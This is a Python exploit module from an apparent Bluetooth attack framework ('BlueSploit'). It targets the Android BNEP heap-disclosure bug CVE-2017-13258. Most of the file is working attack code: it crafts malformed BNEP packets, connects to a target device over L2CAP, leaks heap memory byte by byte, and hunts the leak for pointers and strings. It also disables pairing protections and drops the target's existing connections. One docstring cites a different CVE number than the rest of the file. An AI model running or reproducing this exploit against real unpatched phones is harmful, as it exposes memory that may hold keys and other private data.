"""
BlueSploit Module: BNEP Heap Disclosure (CVE-2017-13258/13260/13261/13262)
Android Bluetooth bnep_data_ind() Remote Heap Disclosure

Exploits a vulnerability in BNEP packet parsing to leak heap memory
byte-by-byte from the com.android.bluetooth process.

Author: Mr-IoT
Original PoC: QuarksLab
CVE: CVE-2017-13258, CVE-2017-13260, CVE-2017-13261, CVE-2017-13262
EDB-ID: 44326
"""

import os
import struct
import time
import subprocess
from typing import Dict, Any, List, Optional, Tuple
from core.base import (
    ExploitModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity, Target
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False


# BNEP Protocol Constants
BNEP_PSM = 0x000F  # 15
BNEP_FRAME_CONTROL = 0x01
BNEP_FRAME_COMPRESSED_ETHERNET = 0x02
BNEP_CONTROL_COMMAND_NOT_UNDERSTOOD = 0x00

# Affected Android versions (March 2018 Security Bulletin)
AFFECTED_VERSIONS = [
    "Android 5.1.1 (before March 2018 patch)",
    "Android 6.0 - 6.0.1 (before March 2018 patch)",
    "Android 7.0 - 7.1.2 (before March 2018 patch)",
    "Android 8.0 - 8.1 (before March 2018 patch)"
]


class Module(ExploitModule):
    """
    BNEP bnep_data_ind() Heap Disclosure (CVE-2017-0782)
    
    This vulnerability exists in the bnep_data_ind() function in Android's 
    Bluetooth stack. By sending malformed BNEP compressed ethernet frames
    with extension headers, an attacker can leak heap memory byte-by-byte.
    
    The leak works by:
    1. Sending BNEP_FRAME_COMPRESSED_ETHERNET with extension bit set
    2. The extension header length field controls pointer advancement
    3. If heap[p + length] > 0x06, it's returned in error response
    4. Response: 0x01 (FRAME_CONTROL) + 0x00 (CMD_NOT_UNDERSTOOD) + leaked_byte
    
    DISCLAIMER: For authorized security testing only.
    """
    
    info = ModuleInfo(
        name="exploits/classic/bnep_heap_disclosure",
        description="BNEP bnep_data_ind() Remote Heap Disclosure (CVE-2017-13258)",
        author=["v33ru", "QuarksLab"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        references=[
            "https://www.exploit-db.com/exploits/44326",
            "https://source.android.com/security/bulletin/2018-03-01",
            "https://blog.quarkslab.com/android-bluetooth-vulnerabilities-in-the-march-2018-security-bulletin.html",
            "https://nvd.nist.gov/vuln/detail/CVE-2017-13258"
        ],
        cve=["CVE-2017-13258", "CVE-2017-13260", "CVE-2017-13261", "CVE-2017-13262"]
    )
    
    def _setup_options(self) -> None:
        self.options = {
            "target": ModuleOption(
                name="target",
                required=True,
                description="Target BD_ADDR (XX:XX:XX:XX:XX:XX)"
            ),
            "src_bdaddr": ModuleOption(
                name="src_bdaddr",
                required=False,
                description="Source BD_ADDR (local adapter, e.g., hci0)",
                default="hci0"
            ),
            "leak_count": ModuleOption(
                name="leak_count",
                required=False,
                description="Number of heap bytes to attempt leaking",
                default=64
            ),
            "timeout": ModuleOption(
                name="timeout",
                required=False,
                description="Socket timeout (seconds)",
                default=5
            ),
            "recv_timeout": ModuleOption(
                name="recv_timeout",
                required=False,
                description="Receive timeout per byte (seconds)",
                default=1
            ),
            "disable_ssp": ModuleOption(
                name="disable_ssp",
                required=False,
                description="Disable Secure Simple Pairing on adapter",
                default=True
            ),
            "disconnect_first": ModuleOption(
                name="disconnect_first",
                required=False,
                description="Disconnect existing connections first",
                default=True
            ),
            "output_file": ModuleOption(
                name="output_file",
                required=False,
                description="Save leaked bytes to file",
                default=None
            )
        }
    
    def _get_adapter_address(self, adapter: str) -> Optional[str]:
        """Get BD_ADDR for adapter name like hci0"""
        try:
            result = subprocess.run(
                ["hciconfig", adapter],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                # Parse output for BD Address
                for line in result.stdout.split('\n'):
                    if "BD Address:" in line:
                        parts = line.split()
                        for i, part in enumerate(parts):
                            if part == "Address:":
                                return parts[i + 1]
            return None
        except Exception:
            return None
    
    def _run_hci_command(self, cmd: str) -> bool:
        """Run HCI command"""
        try:
            result = subprocess.run(
                cmd.split(),
                capture_output=True,
                timeout=10
            )
            return result.returncode == 0
        except Exception as e:
            print_warning(f"HCI command failed: {e}")
            return False
    
    def _disable_ssp(self, adapter: str) -> bool:
        """Disable Secure Simple Pairing on adapter"""
        print_info(f"Disabling SSP on {adapter}...")
        return self._run_hci_command(f"hciconfig {adapter} sspmode 0")
    
    def _disconnect_target(self, target: str) -> bool:
        """Disconnect existing connection to target"""
        print_info(f"Disconnecting existing connections to {target}...")
        return self._run_hci_command(f"hcitool dc {target}")
    
    def _create_leak_packet(self, offset: int) -> bytes:
        """
        Create BNEP packet to leak heap byte at offset.
        
        Packet structure:
        - Byte 0: Type (0x02 = COMPRESSED_ETHERNET) | 0x80 (extension bit)
        - Byte 1: Extension header (0x80 = valid extension, no more extensions)  
        - Byte 2: Length/offset (controls how far ahead in heap to read)
        
        The vulnerability:
        - bnep_data_ind() processes extension headers
        - If the byte at (p + offset) > 0x06, it triggers bnep_send_command_not_understood()
        - The response contains the leaked byte
        """
        # 0x82 = BNEP_FRAME_COMPRESSED_ETHERNET (0x02) | Extension bit (0x80)
        type_and_ext = BNEP_FRAME_COMPRESSED_ETHERNET | 0x80
        
        # 0x80 = Extension with no more extensions following
        # This passes the check: !(ext & 0x7f) 
        ext = 0x80
        
        # offset = how far ahead to leak
        return struct.pack('BBB', type_and_ext, ext, offset)
    
    def _parse_leak_response(self, data: bytes) -> Optional[int]:
        """
        Parse response from bnep_send_command_not_understood().
        
        Response format:
        - Byte 0: 0x01 (BNEP_FRAME_CONTROL)
        - Byte 1: 0x00 (BNEP_CONTROL_COMMAND_NOT_UNDERSTOOD)
        - Byte 2: Leaked byte (the unknown command type)
        """
        if len(data) >= 3:
            if data[0] == BNEP_FRAME_CONTROL and data[1] == BNEP_CONTROL_COMMAND_NOT_UNDERSTOOD:
                return data[2]
        return None
    
    def _leak_heap(self, src_bdaddr: str, target: str, leak_count: int,
                   timeout: int, recv_timeout: int) -> Tuple[Dict[int, int], bool]:
        """
        Perform heap leak attack.
        
        Returns:
            Tuple of (leaked_bytes dict, success bool)
        """
        leaked_bytes: Dict[int, int] = {}
        success = False
        
        sock = None
        try:
            # Create L2CAP socket
            print_info("Creating L2CAP socket...")
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(timeout)
            
            # Bind to source adapter
            print_info(f"Binding to {src_bdaddr}...")
            sock.bind((src_bdaddr, 0))
            
            # Connect to target BNEP
            print_info(f"Connecting to {target} on PSM 0x{BNEP_PSM:04X} (BNEP)...")
            sock.connect((target, BNEP_PSM))
            print_success("Connected to BNEP service!")
            
            # Set receive timeout
            sock.settimeout(recv_timeout)
            
            print_info(f"Leaking {leak_count} bytes from com.android.bluetooth heap...\n")
            
            C = Colors
            
            # Leak bytes one at a time
            for offset in range(leak_count):
                # Create and send leak packet
                pkt = self._create_leak_packet(offset)
                sock.send(pkt)
                
                # Try to receive response
                try:
                    data = sock.recv(3)
                    if data:
                        leaked_byte = self._parse_leak_response(data)
                        if leaked_byte is not None:
                            leaked_bytes[offset] = leaked_byte
                            success = True
                            # Print with hex and ASCII representation
                            ascii_char = chr(leaked_byte) if 32 <= leaked_byte < 127 else '.'
                            print(f"  {C.GREEN}heap[p + 0x{offset:02X}]{C.RESET} = {C.YELLOW}0x{leaked_byte:02X}{C.RESET} ({C.CYAN}{ascii_char}{C.RESET})")
                        else:
                            print(f"  {C.DARK_GREY}heap[p + 0x{offset:02X}] = unexpected response{C.RESET}")
                    else:
                        print(f"  {C.DARK_GREY}heap[p + 0x{offset:02X}] <= 0x06 (no response){C.RESET}")
                        
                except bluetooth.btcommon.BluetoothError:
                    # No response means byte value was <= 0x06
                    print(f"  {C.DARK_GREY}heap[p + 0x{offset:02X}] <= 0x06{C.RESET}")
                except Exception as e:
                    print(f"  {C.RED}heap[p + 0x{offset:02X}] error: {e}{C.RESET}")
            
            print()
            
        except bluetooth.btcommon.BluetoothError as e:
            err_str = str(e)
            if "Connection refused" in err_str or "111" in err_str:
                print_error("Connection refused - BNEP service not available")
                print_info("Target may not support BNEP or is not Android")
            elif "Host is down" in err_str or "112" in err_str:
                print_error("Host is down - device not reachable")
            elif "Connection reset" in err_str:
                print_warning("Connection reset - possible crash triggered")
                success = True  # Crash indicates vulnerability
            elif "timed out" in err_str.lower():
                print_error("Connection timed out")
            else:
                print_error(f"Bluetooth error: {e}")
        except Exception as e:
            print_error(f"Error: {e}")
        finally:
            if sock:
                print_info("Closing connection...")
                try:
                    sock.close()
                except:
                    pass
        
        return leaked_bytes, success
    
    def _print_results(self, target: str, leaked_bytes: Dict[int, int], 
                       success: bool) -> None:
        """Print exploit results in table format"""
        C = Colors
        
        print(f"\n  {C.CYAN}{'='*90}{C.RESET}")
        print(f"  {C.BOLD}{C.WHITE}BNEP HEAP DISCLOSURE RESULTS{C.RESET}")
        print(f"  {C.CYAN}{'='*90}{C.RESET}")
        print(f"  CVE          : {C.RED}CVE-2017-13258/13260/13261/13262{C.RESET}")
        print(f"  Target       : {C.WHITE}{target}{C.RESET}")
        print(f"  Bytes Leaked : {C.YELLOW}{len(leaked_bytes)}{C.RESET}")
        print(f"  Status       : {C.GREEN if success else C.RED}{'SUCCESS' if success else 'FAILED'}{C.RESET}")
        
        if leaked_bytes:
            print(f"\n  {C.BOLD}LEAKED HEAP DATA{C.RESET}")
            print(f"  {C.CYAN}{'-'*90}{C.RESET}")
            
            # Create hex dump
            print(f"\n  {C.BOLD}Hex Dump:{C.RESET}")
            hex_line = "  "
            ascii_line = ""
            
            max_offset = max(leaked_bytes.keys()) if leaked_bytes else 0
            
            for i in range(max_offset + 1):
                if i % 16 == 0 and i > 0:
                    print(f"{hex_line}  |{ascii_line}|")
                    hex_line = "  "
                    ascii_line = ""
                
                if i in leaked_bytes:
                    byte_val = leaked_bytes[i]
                    hex_line += f"{C.YELLOW}{byte_val:02X}{C.RESET} "
                    ascii_line += chr(byte_val) if 32 <= byte_val < 127 else '.'
                else:
                    hex_line += f"{C.DARK_GREY}??{C.RESET} "
                    ascii_line += '?'
            
            # Print remaining bytes
            if hex_line.strip():
                # Pad hex line
                remaining = 16 - (max_offset % 16) - 1
                hex_line += "   " * remaining
                print(f"{hex_line}  |{ascii_line}|")
            
            # Raw bytes for analysis
            print(f"\n  {C.BOLD}Raw Leaked Bytes:{C.RESET}")
            raw_hex = ' '.join(f"{leaked_bytes[i]:02X}" for i in sorted(leaked_bytes.keys()))
            print(f"  {raw_hex}")
            
            # Look for patterns
            print(f"\n  {C.BOLD}Pattern Analysis:{C.RESET}")
            
            # Check for potential pointers (ARM 32-bit)
            sorted_offsets = sorted(leaked_bytes.keys())
            for i in range(len(sorted_offsets) - 3):
                if all(sorted_offsets[i] + j in leaked_bytes for j in range(4)):
                    ptr_bytes = bytes([leaked_bytes[sorted_offsets[i] + j] for j in range(4)])
                    ptr = struct.unpack('<I', ptr_bytes)[0]
                    if 0x10000000 <= ptr <= 0xFFFFFFFF:
                        print(f"  {C.RED}Potential pointer at offset 0x{sorted_offsets[i]:02X}: 0x{ptr:08X}{C.RESET}")
            
            # Check for ASCII strings
            ascii_str = ""
            start_offset = -1
            for offset in sorted_offsets:
                byte_val = leaked_bytes[offset]
                if 32 <= byte_val < 127:
                    if start_offset == -1:
                        start_offset = offset
                    ascii_str += chr(byte_val)
                else:
                    if len(ascii_str) >= 4:
                        print(f"  {C.GREEN}ASCII string at offset 0x{start_offset:02X}: \"{ascii_str}\"{C.RESET}")
                    ascii_str = ""
                    start_offset = -1
            
            if len(ascii_str) >= 4:
                print(f"  {C.GREEN}ASCII string at offset 0x{start_offset:02X}: \"{ascii_str}\"{C.RESET}")
        
        # Vulnerability info
        print(f"\n  {C.CYAN}{'-'*90}{C.RESET}")
        print(f"  {C.BOLD}VULNERABILITY INFO{C.RESET}")
        print(f"  {C.CYAN}{'-'*90}{C.RESET}")
        print(f"  Function     : bnep_data_ind()")
        print(f"  Type         : Remote Heap Information Disclosure")
        print(f"  Protocol     : BNEP (Bluetooth Network Encapsulation Protocol)")
        print(f"  PSM          : 0x{BNEP_PSM:04X}")
        print(f"  Impact       : Leak heap memory from com.android.bluetooth process")
        print(f"  Limitation   : Only leaks bytes > 0x06")
        
        print(f"\n  {C.BOLD}AFFECTED VERSIONS{C.RESET}")
        for ver in AFFECTED_VERSIONS:
            print(f"    - {ver}")
        
        if success:
            print(f"\n  {C.RED}[!] TARGET IS VULNERABLE TO CVE-2017-13258{C.RESET}")
            print(f"  {C.YELLOW}    Leaked data may contain sensitive information (pointers, keys, etc.){C.RESET}")
            print(f"  {C.YELLOW}    Recommend: Update to Android security patch March 2018 or later{C.RESET}")
        else:
            print(f"\n  {C.GREEN}[+] Target may be patched or not vulnerable{C.RESET}")
        
        print(f"\n  {C.CYAN}{'='*90}{C.RESET}\n")
    
    def _save_results(self, leaked_bytes: Dict[int, int], filename: str) -> None:
        """Save leaked bytes to file"""
        try:
            with open(filename, 'w') as f:
                f.write("# BNEP Heap Disclosure Results\n")
                f.write("# Offset: Value (hex)\n\n")
                for offset in sorted(leaked_bytes.keys()):
                    f.write(f"0x{offset:02X}: 0x{leaked_bytes[offset]:02X}\n")
                
                # Also write raw hex
                f.write("\n# Raw hex dump:\n")
                raw_hex = ' '.join(f"{leaked_bytes[i]:02X}" for i in sorted(leaked_bytes.keys()))
                f.write(raw_hex + "\n")
            
            print_success(f"Results saved to: {filename}")
        except Exception as e:
            print_error(f"Failed to save results: {e}")
    
    def run(self) -> bool:
        """Execute BNEP heap disclosure exploit"""
        
        if not BLUETOOTH_AVAILABLE:
            print_error("PyBluez library not installed!")
            print_info("Install with: pip install pybluez")
            print_info("Also need: sudo apt install libbluetooth-dev")
            return False
        
        # Check if running as root
        if os.getuid() != 0:
            print_error("This exploit must be run as root!")
            print_info("Run with: sudo python bluesploit.py")
            return False
        
        target = self.target
        src_adapter = self.get_option("src_bdaddr")
        leak_count = int(self.get_option("leak_count"))
        timeout = int(self.get_option("timeout"))
        recv_timeout = int(self.get_option("recv_timeout"))
        disable_ssp = self.get_option("disable_ssp")
        disconnect_first = self.get_option("disconnect_first")
        output_file = self.get_option("output_file")
        
        # Validate target BD_ADDR
        if not self.validate_bd_addr(target):
            print_error(f"Invalid target BD_ADDR: {target}")
            return False
        
        # Get source adapter address
        if src_adapter.startswith("hci"):
            src_bdaddr = self._get_adapter_address(src_adapter)
            if not src_bdaddr:
                print_error(f"Could not get BD_ADDR for adapter {src_adapter}")
                print_info("Make sure adapter exists: hciconfig -a")
                return False
            print_info(f"Using adapter {src_adapter} ({src_bdaddr})")
        else:
            src_bdaddr = src_adapter
        
        # Print attack info
        C = Colors
        print(f"\n  {C.RED}╔{'═'*70}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}BNEP bnep_data_ind() Heap Disclosure (CVE-2017-13258){C.RESET}              {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*70}╝{C.RESET}\n")
        
        print_info(f"Target        : {target}")
        print_info(f"Source        : {src_bdaddr}")
        print_info(f"Leak Count    : {leak_count} bytes")
        print_info(f"PSM           : 0x{BNEP_PSM:04X} (BNEP)")
        
        print()
        print_warning("DISCLAIMER: For authorized security testing only!")
        print_info("Starting in 3 seconds... (Ctrl+C to cancel)")
        
        try:
            time.sleep(3)
        except KeyboardInterrupt:
            print_warning("Cancelled by user")
            return False
        
        # Pre-attack setup
        if disable_ssp:
            self._disable_ssp(src_adapter if src_adapter.startswith("hci") else "hci0")
        
        if disconnect_first:
            self._disconnect_target(target)
        
        # Perform leak
        leaked_bytes, success = self._leak_heap(
            src_bdaddr, target, leak_count, timeout, recv_timeout
        )
        
        # Print results
        self._print_results(target, leaked_bytes, success)
        
        # Save results if requested
        if output_file and leaked_bytes:
            self._save_results(leaked_bytes, output_file)
        
        # Store result
        self.add_result({
            "target": target,
            "cve": ["CVE-2017-13258", "CVE-2017-13260", "CVE-2017-13261", "CVE-2017-13262"],
            "bytes_leaked": len(leaked_bytes),
            "vulnerable": success,
            "leaked_data": {f"0x{k:02X}": f"0x{v:02X}" for k, v in leaked_bytes.items()}
        })
        
        return success
